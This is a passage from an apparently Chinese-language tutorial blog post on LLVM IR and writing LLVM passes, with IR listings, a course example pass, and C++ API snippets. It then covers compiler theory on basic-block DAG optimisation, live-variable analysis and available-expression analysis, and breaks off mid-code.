class="line">define dso_local i32 @<span class="keyword">test</span>(i32) #<span class="number">0</span> &#123;</span><br><span class="line">  <span class="comment">; 所需的栈空间。align用于对齐内存</span></span><br><span class="line">  <span class="subst">%2</span> = alloca i32, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%3</span> = alloca i32, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%4</span> = alloca i32, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%5</span> = alloca i32, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%6</span> = alloca i32, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%7</span> = alloca i32, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="comment">; %0 即函数的第一个参数</span></span><br><span class="line">  store i32 <span class="subst">%0</span>, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%8</span> = load i32, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%9</span> = icmp slt i32 <span class="subst">%8</span>, <span class="number">0</span></span><br><span class="line">  br i1 <span class="subst">%9</span>, label <span class="subst">%10</span>, label <span class="subst">%11</span>     <span class="comment">; 分支跳转</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>:                                               <span class="comment">; preds = %1</span></span><br><span class="line">  store i32 <span class="number">2</span>, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  br label</span> <span class="subst">%11</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>:                                               <span class="comment">; preds = %10, %1</span></span><br><span class="line">  <span class="subst">%12</span> = load i32, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%13</span> = <span class="keyword">add</span> nsw i32 <span class="subst">%12</span>, <span class="number">0</span></span><br><span class="line">  store i32 <span class="subst">%13</span>, i32* <span class="subst">%3</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%14</span> = load i32, i32* <span class="subst">%3</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%15</span> = <span class="keyword">add</span> nsw i32 <span class="subst">%14</span>, <span class="number">3</span></span><br><span class="line">  store i32 <span class="subst">%15</span>, i32* <span class="subst">%4</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%16</span> = load i32, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%17</span> = <span class="keyword">mul</span> nsw i32 <span class="number">2</span>, <span class="subst">%16</span></span><br><span class="line">  store i32 <span class="subst">%17</span>, i32* <span class="subst">%5</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%18</span> = load i32, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%19</span> = <span class="keyword">add</span> nsw i32 <span class="subst">%18</span>, <span class="number">1</span></span><br><span class="line">  store i32 <span class="subst">%19</span>, i32* <span class="subst">%6</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%20</span> = load i32, i32* <span class="subst">%6</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%21</span> = <span class="keyword">sub</span> nsw i32 <span class="subst">%20</span>, <span class="number">1</span></span><br><span class="line">  store i32 <span class="subst">%21</span>, i32* <span class="subst">%7</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%22</span> = load i32, i32* <span class="subst">%3</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%23</span> = load i32, i32* <span class="subst">%5</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%24</span> = <span class="keyword">add</span> nsw i32 <span class="subst">%22</span>, <span class="subst">%23</span></span><br><span class="line">  <span class="subst">%25</span> = load i32, i32* <span class="subst">%6</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%26</span> = <span class="keyword">add</span> nsw i32 <span class="subst">%24</span>, <span class="subst">%25</span></span><br><span class="line">  <span class="subst">%27</span> = load i32, i32* <span class="subst">%7</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  <span class="subst">%28</span> = <span class="keyword">add</span> nsw i32 <span class="subst">%26</span>, <span class="subst">%27</span></span><br><span class="line">  <span class="keyword">ret</span> i32 <span class="subst">%28</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #<span class="number">0</span> = &#123; noinline nounwind uwtable <span class="string">"correctly-rounded-divide-sqrt-fp-math"</span>=<span class="string">"false"</span> <span class="string">"disable-tail-calls"</span>=<span class="string">"false"</span> <span class="string">"less-precise-fpmad"</span>=<span class="string">"false"</span> <span class="string">"min-legal-vector-width"</span>=<span class="string">"0"</span> <span class="string">"no-frame-pointer-elim"</span>=<span class="string">"true"</span> <span class="string">"no-frame-pointer-elim-non-leaf"</span> <span class="string">"no-infs-fp-math"</span>=<span class="string">"false"</span> <span class="string">"no-jump-tables"</span>=<span class="string">"false"</span> <span class="string">"no-nans-fp-math"</span>=<span class="string">"false"</span> <span class="string">"no-signed-zeros-fp-math"</span>=<span class="string">"false"</span> <span class="string">"no-trapping-math"</span>=<span class="string">"false"</span> <span class="string">"stack-protector-buffer-size"</span>=<span class="string">"8"</span> <span class="string">"target-cpu"</span>=<span class="string">"x86-64"</span> <span class="string">"target-features"</span>=<span class="string">"+fxsr,+mmx,+sse,+sse2,+x87"</span> <span class="string">"unsafe-fp-math"</span>=<span class="string">"false"</span> <span class="string">"use-soft-float"</span>=<span class="string">"false"</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm<span class="number">.</span>module<span class="number">.</span>flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm<span class="number">.</span>ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">"wchar_size"</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">"clang version 8.0.1-7 (tags/RELEASE_801/final)"</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-Pass初探">3. Pass初探</h2>
<ul>
<li>
<p>LLVM 的pass框架是LLVM系统的一个很重要的部分。LLVM的优化和转换工作就是由多个pass来一起完成的。类似流水线操作一样，每个pass完成特定的优化工作。 要想真正发挥LLVM的威力，掌握pass是不可或缺的一环。</p>
</li>
<li>
<p>LLVM中pass架构的可重用性和可控制性都非常好，这允许用户自己开发pass或者关闭一些默认提供的pass。</p>
</li>
<li>
<p>总的来说，所有的pass大致可以分为两类：</p>
<ul>
<li>分析(<code>analysis</code>)和转换分析类的pass以提供信息为主</li>
<li>转换类(<code>transform</code>)的pass优化中间代码</li>
</ul>
</li>
<li>
<p>下文是一个简单的pass（CSCD70课程-Assignment1-FunctionInfo）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"llvm-9/llvm/Pass.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"llvm-9/llvm/IR/Module.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"llvm-9/llvm/Support/raw_ostream.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承自ModulePass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInfo</span> <span class="title">final</span> :</span> <span class="keyword">public</span> ModulePass</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line"></span><br><span class="line">  FunctionInfo() : ModulePass(ID) &#123;&#125;</span><br><span class="line">  <span class="keyword">virtual</span> ~FunctionInfo() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// We don't modify the program, so we preserve all analysis.</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">getAnalysisUsage</span><span class="params">(AnalysisUsage &amp; AU)</span> <span class="keyword">const</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    AU.setPreservesAll();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">runOnModule</span><span class="params">(Module &amp; M)</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    outs() &lt;&lt; <span class="string">"CSCD70 Functions Information Pass"</span> &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">bool</span> transformed = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 遍历内含的所有函数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = M.begin(); iter != M.end(); ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">      Function &amp;func = *iter;</span><br><span class="line">      outs() &lt;&lt; <span class="string">"Name:"</span> &lt;&lt; func.getName() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      outs() &lt;&lt; <span class="string">"Number of Arguments: "</span> &lt;&lt; func.arg_size() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      outs() &lt;&lt; <span class="string">"Number of Direct Call Sites in the same LLVM module: "</span></span><br><span class="line">        &lt;&lt; func.getNumUses() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      outs() &lt;&lt; <span class="string">"Number of Basic Blocks: "</span> &lt;&lt; func.size() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      outs() &lt;&lt; <span class="string">"Number of Instructions: "</span> &lt;&lt; func.getInstructionCount() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      transformed = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformed;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> FunctionInfo::ID = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 注册自定义pass</span></span><br><span class="line">RegisterPass &lt; FunctionInfo &gt; X (</span><br><span class="line">  <span class="string">"function-info"</span>,</span><br><span class="line">  <span class="string">"CSCD70: Functions Information"</span>);</span><br><span class="line">&#125;  <span class="comment">// namespace anonymous</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>基础pass有很多类，一些常用的pass类分别是</p>
<ul>
<li>ModulePass</li>
<li>FunctionPass</li>
<li>BasicBlockPass</li>
<li>等等</li>
</ul>
</li>
<li>
<p>一个<code>Module</code>类实例对应一个源码文件。在<code>Module</code>类中含有以下列表，其中以<code>FunctionList</code>为首。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">GlobalListType GlobalList;      <span class="comment">///&lt; The Global Variables in the module</span></span><br><span class="line">FunctionListType FunctionList;  <span class="comment">///&lt; The Functions in the module</span></span><br><span class="line">AliasListType AliasList;        <span class="comment">///&lt; The Aliases in the module</span></span><br><span class="line">IFuncListType IFuncList;        <span class="comment">///&lt; The IFuncs in the module</span></span><br><span class="line">NamedMDListType NamedMDList;    <span class="comment">///&lt; The named metadata in the module</span></span><br></pre></td></tr></table></figure>
<p>在<code>Function</code>类中，又有基础块列表（<code>BasicBlocks</code>）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BasicBlockListType BasicBlocks;</span><br></pre></td></tr></table></figure>
<p><code>BasicBlock</code>类中，内含指令列表（<code>InstList</code>）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">InstListType InstList;</span><br></pre></td></tr></table></figure>
<p>一个<code>Instruction</code>类实例对应一条IR代码<br>
上述几个类内有联系，层次分明。其关系如下</p>
<pre class="mermaid">  graph LR;
Module --内含--> GlobalVariable
Module --内含--> Function
Module --内含--> ......
Function --内含--> BasicBlock
BasicBlock --内含--> Instruction</pre>
</li>
<li>
<p>以下是几个较常用类的结构图</p>
<pre class="mermaid">  graph TB;
Value --派生--> User
User --派生--> Constant
User --派生--> Instruction
Instruction --派生--> BinaryOperator
Constant --派生--> ConstantData
ConstantData --派生--> ConstantInt</pre>
</li>
<li>
<p>在编写pass对IR进行优化时，</p>
<ul>
<li>
<p><code>Value ⇒ ConstantInt</code>类型转换</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果转换失败，即Type不是ConstantInt类继承链上的，则返回NULL</span></span><br><span class="line"><span class="comment">// 通常来讲，Value类转ConstantInt类比较常见</span></span><br><span class="line">Type <span class="keyword">_t</span>;</span><br><span class="line"><span class="comment">/* ...... */</span></span><br><span class="line">ConstantInt* val = dyn_cast&lt;ConstantInt&gt;(<span class="keyword">_t</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>获取<code>ConstantInt</code>类的值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ConstantInt* const_int;</span><br><span class="line"><span class="comment">/* ...... */</span></span><br><span class="line"><span class="keyword">uint64_t</span> val = const_int-&gt;getZExtValue();</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>替换某个指令</p>
<ul>
<li>
<p>用法</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Instruction inst;</span><br><span class="line"><span class="comment">/* ...... */</span></span><br><span class="line"><span class="comment">// 替换该指令所有出现的位置为val。注意，只是替换了该指令结果的引用，该指令并没有被删除</span></span><br><span class="line">inst.replaceAllUsesWith(val);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除指令请使用以下代码。</span></span><br><span class="line"><span class="comment">// 注意：必须在遍历所有Instruction之后再删除，避免Instruction迭代器出现错误</span></span><br><span class="line"><span class="keyword">if</span>(inst-&gt;isSafeToRemove())</span><br><span class="line">    <span class="comment">// 注意，用erase而不是remove，以至于unlink &amp; delete。</span></span><br><span class="line">    inst-&gt;eraseFromParent();</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>IR代码示例</p>
  <figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 执行Pass前</span></span><br><span class="line"><span class="subst">%12</span> = load i32, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="subst">%13</span> = <span class="keyword">add</span> nsw i32 <span class="subst">%12</span>, <span class="number">0</span></span><br><span class="line">store i32 <span class="subst">%13</span>, i32* <span class="subst">%3</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="comment">; *********************************************</span></span><br><span class="line"><span class="comment">; Pass中只替换指令引用。执行Pass后</span></span><br><span class="line"><span class="subst">%12</span> = load i32, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="subst">%13</span> = <span class="keyword">add</span> nsw i32 <span class="subst">%12</span>, <span class="number">0</span>          <span class="comment">; 没有任何指令引用这条指令的结果，但这条指令仍然存在</span></span><br><span class="line">store i32 <span class="subst">%12</span>, i32* <span class="subst">%3</span>, <span class="meta">align</span> <span class="number">4</span>   <span class="comment">; 结果的引用发生改动，%13 ⇒ %12</span></span><br><span class="line"><span class="comment">; *********************************************</span></span><br><span class="line"><span class="comment">; Pass中既替换指令引用，又删除原先指令</span></span><br><span class="line"><span class="subst">%12</span> = load i32, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">store i32 <span class="subst">%12</span>, i32* <span class="subst">%3</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="comment">; *********************************************</span></span><br><span class="line"><span class="comment">; Pass中替换指令引用，但删除指令所执行的是inst-&gt;removeFromParent()， 报错！</span></span><br><span class="line">Instruction referencing instruction <span class="keyword">not</span> embedded <span class="keyword">in</span> a basic block!</span><br><span class="line">  <span class="subst">%12</span> = load i32, i32* <span class="subst">%2</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line">  &lt;badref&gt; = <span class="keyword">add</span> nsw i32 <span class="subst">%12</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>建立新指令</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 取出当前指令的第一个操作数</span></span><br><span class="line">Value* val = inst.getOperand(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 新建IRBuilder，其中传入Instruction*以确定新指令的插入位置等等</span></span><br><span class="line"><span class="function">IRBuilder&lt;&gt; <span class="title">builder</span><span class="params">(&amp;inst)</span></span>;</span><br><span class="line"><span class="comment">// 建立新指令 "val &lt;&lt; 1"</span></span><br><span class="line">Value* newInst = builder.CreateShl(val, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 替换原先指令</span></span><br><span class="line">inst.replaceAllUsesWith(newInst);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>LLVM示例代码 - <a href="https://github.com/Kiprey/Skr_Learning/tree/master/week7-8/Assignment1-Introduction_to_LLVM" target="_blank" rel="noopener">github</a></p>
</blockquote>
<h2 id="4-基本块的优化">4. 基本块的优化</h2>
<ul>
<li>很多重要的 <strong>局部优化技术</strong> 首先把一个基本块转换成为一个 <strong>无环有向图(directed acyclic graph，DAG)</strong></li>
</ul>
<h3 id="a-基本块的DAG表示">a. 基本块的DAG表示</h3>
<ul>
<li>基本块中每个 <strong>语句</strong> s都对应一个 <strong>内部节点</strong> N</li>
<li>结点N的 <strong>标号</strong> 是s中的 <strong>运算符</strong> ；同时还有一个 <strong>定值变量表</strong> 被关联到N ，表示s是在此基本块内最晚对表中变量进行定值的语句</li>
<li>N的 <strong>子结点</strong> 是基本块中在s之前、最后一个对s所使用的 <strong>运算分量</strong> 进行定值的 <strong>语句对应的结点</strong>。如果s的某个运算分量在基本块内没有在s之前被定值，则这个运算分量对应的子结点就是代表该运算分量初始值的 <strong>叶结点</strong>(为区别起见，叶节点的定值变量表中的变量加上下标0)</li>
<li>在为语句x=y+z构造结点N的时候，如果x已经在某结点M的定值变量表中，则从M的定值变量表中删除变量x</li>
<li>例子
<blockquote>
<p>左侧是三地址代码，右侧是基本块的DAG表示<br>
<img src="/2020/06/LLVM-IR-pass/BasicBlockDAGExample.png" alt="img"></p>
</blockquote>
</li>
</ul>
<h3 id="b-基于DAG删除无关代码">b. 基于DAG删除无关代码</h3>
<ul>
<li>从一个DAG上删除所有 <strong>没有附加活跃变量</strong> 的 <strong>根节点</strong>。重复此操作即可删除所有对应于无用代码的节点。</li>
<li>例子<br>
<img src="/2020/06/LLVM-IR-pass/DAGDeleteUnuseVariable.png" alt="img"></li>
</ul>
<h3 id="c-可获取的信息">c. 可获取的信息</h3>
<ul>
<li>确定 <strong>DAG中创建了叶节点的那些变量</strong> 在该基本块中赋值前被 <strong>引用</strong></li>
<li>确定 <strong>DAG中为语句s创建的节点N</strong>，可以在基本块外被应用。
<blockquote>
<p>在DAG构造结束时x仍然是N的定值变量</p>
</blockquote>
</li>
</ul>
<h2 id="5-数据流分析">5. 数据流分析</h2>
<h3 id="基础知识">*. 基础知识</h3>
<ul>
<li>数据流分析是一组用来获取程序执行路径上的数据流信息的技术。</li>
<li>数据流分析技术的应用
<ul>
<li>到达-定值分析（Reaching-Definition Analysis)</li>
<li>活跃变量分析（Live-Variable Analysis)</li>
<li>可用表达式分析（Available-Exprssion Analysis）</li>
</ul>
<blockquote>
<p>在每一种数据流分析应用中，都会把每个 <strong>程序点</strong> 和一个 <strong>数据流值</strong> 关联起来。</p>
</blockquote>
</li>
<li>语句的数据流模式
<ul>
<li><code>IN[s]</code> : 语句s之前的数据流值<br>
<code>OUT[s]</code> : 语句s之后的数据流值</li>
<li>$f_s$: 语句s的 <strong>传递函数</strong>（transfer function）
<blockquote>
<p>一个赋值语句s之前和之后的数据流值的关系<br>
传递函数有两种风格：</p>
</blockquote>
<ul>
<li>信息沿执行路径前向传播（前向数据流问题） ：$OUT[s] = f_s(IN[s])$</li>
<li>信息沿执行路径逆向传播（逆向数据流问题） ：$IN[s] = f_s(OUT[s])$</li>
</ul>
</li>
<li>基本块中相邻两个语句之间的数据流值的关系:
<ul>
<li>设基本块B由语句s1, s2, … , sn 顺序组成，则<br>
$$IN[s_{i+1}]= OUT[s_i]\qquad(i=1,2,…,n-1)$$</li>
</ul>
</li>
</ul>
</li>
<li>基本块的数据流模式
<ul>
<li><code>IN[B]</code> : 紧靠基本块B <strong>之前</strong> 的数据流值<br>
<code>OUT[B]</code> : 紧靠基本块B <strong>之后</strong> 的数据流值</li>
<li>设基本块B由语句$s_1,s_2,…,s_n$ 顺序组成，则
<ul>
<li>$IN[B]=IN[s_1]$</li>
<li>$OUT[B]=OUT[s_n]$</li>
</ul>
</li>
<li>$f_B$:基本块B的传递函数
<ul>
<li>前向数据流问题：$OUT[B] = f_B(IN[B])$<br>
$f_B = f_{s_n}·…·f_{s_2} ·f_{s_1}$</li>
<li>后向数据流问题：$IN[B] = f_B(OUT[B])$<br>
$f_B = f_{s_1}· f_{s_2} · …·f_{s_n}$</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="a-活跃变量分析">a. 活跃变量分析</h3>
<ul>
<li>对于变量x和程序点p，如果在流图中沿着从p开始的某条路径会引用变量x在p点的值，则称变量x在点p是 <strong>活跃</strong>(live)的，否则称变量x在点p <strong>不活跃</strong>(dead)<br>
<img src="/2020/06/LLVM-IR-pass/live_variable_example.png" alt="img"></li>
<li>活跃变量信息的主要用途
<ul>
<li>删除无用赋值</li>
<li>为基本块分配寄存器</li>
</ul>
</li>
<li>活跃变量的传递函数
<blockquote>
<p>逆向数据流问题</p>
</blockquote>
<ul>
<li>$IN[B]=f_B(OUT[B])$</li>
<li>$f_B(x)=use_B\bigcup(x-def_B)$
<blockquote>
<p>$def_B$：在基本块B中 <strong>定值</strong>，但是定值前在B中没有被 <strong>引用</strong> 的变量的集合。<br>
$use_B$：在基本块B中 <strong>引用</strong>，但是引用前在B中没有被 <strong>定值</strong> 的变量集合。<br>
例：各基本块B的$use_B$和$def_B$<br>
<img src="/2020/06/LLVM-IR-pass/useb_and_defb.png" alt="img"></p>
</blockquote>
</li>
</ul>
</li>
<li>活跃变量的数据流方程
<ul>
<li>$IN[B]$：在基本块B的入口处的活跃变量集合<br>
$OUT[B]$：在基本块B的出口处的活跃变量集合</li>
<li>方程
<ul>
<li>$IN[EXIT]=\Phi$</li>
<li>$IN[B]=f_B(OUT[B])\qquad(B\neq EXIT)$</li>
<li>$OUT[B]=\bigcup_{S是B的一个后继}IN[S]\qquad(B\neq EXIT)$</li>
</ul>
</li>
</ul>
</li>
<li>计算活跃变量的迭代算法
<ul>
<li>输入：流图G，其中每个基本块B的$use_B$和$def_B$都已计算出来</li>
<li>输出：$IN[B]$和$OUT[B]$</li>
<li>伪代码：<br>
<img src="/2020/06/LLVM-IR-pass/live_variable_code.png" alt="img"></li>
<li>例子<br>
<img src="/2020/06/LLVM-IR-pass/live_variable_code_example.png" alt="img"></li>
</ul>
</li>
</ul>
<blockquote>
<p>LLVM示例代码 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week7-8/Assignment2-Dataflow_Analysis/src/liveness.cpp" target="_blank" rel="noopener">github</a></p>
</blockquote>
<h3 id="b-可用表达式">b. 可用表达式</h3>
<ul>
<li>
<p>可用表达式（available expressions）</p>
<ul>
<li>如果从流图的 <strong>首节点</strong> 到达程序点p的 <strong>每条</strong> 路径都对表达式<code>x op y</code>进行计算，并且从最后一个这样的计算到点p之间 <strong>没有再次对x或y定值</strong>，那么表达式<code>x op y</code>点p是 <strong>可用</strong> 的(available)</li>
<li>直观意义：在点p上，<code>x op y</code>已经在之前被计算过，不需要重新计算</li>
</ul>
</li>
<li>
<p>用途：</p>
<ul>
<li>消除全局公共子表达式<br>
<img src="/2020/06/LLVM-IR-pass/deletePublicSubexpression.png" alt="img"></li>
<li>进行复制传播<br>
<img src="/2020/06/LLVM-IR-pass/copy_example.png" alt="img"></li>
</ul>
</li>
<li>
<p>传递函数（Transform Function）</p>
<ul>
<li>
<p>对于可用表达式数据流模式而言，如果基本块B对x或者y <strong>可能</strong> 进行了定值，且以后没有重新计算x op y，则称B <strong>杀死（kill）</strong> 表达式x op y。如果基本块B对x op y进行计算，并且 <strong>之后没有重新定值</strong> x或y，则称B <strong>生成（generate）</strong> 表达式x op y</p>
<blockquote>
<p>杀死：指的是在后续中如果需要计算<code>x op y</code>，则原先的计算结果不可使用，原因是x或y <strong>可能</strong> 在这两个过程中间进行了定值操作<br>
生成：指的是在后续中如果需要计算<code>x op y</code>，则原先的计算结果可以之间使用。</p>
</blockquote>
<p>一个简单的例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">a = b + c <span class="comment">// 生成表达式 b + c</span></span><br><span class="line">d = e + f</span><br><span class="line">g = b + c <span class="comment">// 代码优化时，由于 b+c没有被杀死，所以这一步可以优化为 g = a</span></span><br><span class="line">b = d     <span class="comment">// 注意：b被重新定值，与之相关的表达式 b + c被杀死</span></span><br><span class="line">f = b + c <span class="comment">// 由于b+c被杀死，所以代码优化时就  不能！ 优化为f = a</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>$f_B(x)=e$_ $gen_B\bigcup(x-e$_ $kill_B)$</p>
<ul>
<li>$e$_ $gen_B$: 基本块B所生成的可用表达式的集合</li>
<li>$e$_ $kill_B$: 基本块B所杀死的U中的可用表达式的集合</li>
<li>U ：所有出现在程序中一个或多个语句的右部的表达式的全集</li>
</ul>
</li>
</ul>
</li>
<li>
<p>$e\underline{ }gen_B$的计算</p>
<ul>
<li>初始化：$e\underline{ }gen_B=\Phi$</li>
<li>顺序扫描基本块的每个语句: $z=x\ op\ y$
<ul>
<li>把$x\ op\ y$加入$e\underline{ }gen_B$</li>
<li>从$e\underline{ }gen_B$中删除和z有关的表达式（kill）</li>
</ul>
</li>
</ul>
</li>
<li>
<p>$e\underline{ }kill_B$的计算</p>
<ul>
<li>初始化：$e\underline{ }kill_B=\Phi$</li>
<li>顺序扫描基本块的每个语句: $z=x\ op\ y$
<ul>
<li>从$e\underline{ }kill_B$中删除表达式$x\ op\ y$</li>
<li>把所有和z相关的表达式加入到$e\underline{ }kill_B$</li>
</ul>
</li>
</ul>
</li>
<li>
<p>可用表达式的数据流方程</p>
<ul>
<li>$IN[B]$：在B的入口处可用的U中的表达式集合<br>
$OUT[B]$：在B的出口处可用的U中的表达式集合</li>
<li>方程
<ul>
<li>$OUT[ENTRY]=\Phi$</li>
<li>$OUT[B]=f_B(IN[B])\qquad(B\neq ENTRY)$
<ul>
<li>$f_B(x)=e\underline{ }gen_B\bigcup(x-e\underline{ }kill_B)$</li>
</ul>
</li>
<li>$IN[B]=\bigcap_{P是B的一个前驱}OUT[P]\qquad(B\neq ENTRY)$</li>
</ul>
<blockquote>
<p>注：$e\underline{ }gen_B$和$e\underline{ }kill_B$可以直接从流图中计算出，因此是 <strong>已知量</strong></p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>计算可用表达式的迭代算法</p>
<ul>
<li>
<p>输入：流图G，其中每个基本块B的$e\underline{ }gen_B$和$e\underline{ }kill_B$都已计算出来</p>
</li>
<li>
<p>输出：$IN[B]$和$OUT[B]$</p>
</li>
<li>
<p>算法：<br>
<img src="/2020/06/LLVM-IR-pass/availableExpr_code.png" alt="img"><br>
示例代码：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp; F)</span> <span class="keyword">override</span> <span class="keyword">final</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp; inst : instructions(F))</span><br><span class="line">    &#123;</span><br><span class="line">        InitializeDomainFromInstruction(inst);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp; inst : instructions(F))</span><br><span class="line">    &#123;</span><br><span class="line">        _inst_bv_map.emplace(&amp;inst, IC()); <span class="comment">// IC 初始条件</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// keep traversing until changes have been made to the</span></span><br><span class="line">    <span class="comment">// instruction-bv mapping</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (traverseCFG(F)) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    printInstBVMap(F);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">traverseCFG</span><span class="params">(<span class="keyword">const</span> Function &amp; func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> transform = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> BasicBlock&amp; basicBlock : BBTraversalOrder(func))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// OUT[B]和IN[B]的节点集合</span></span><br><span class="line">        BitVector ibv;</span><br><span class="line">        BitVector obv;</span><br><span class="line">        <span class="comment">// 确定IN集合</span></span><br><span class="line">        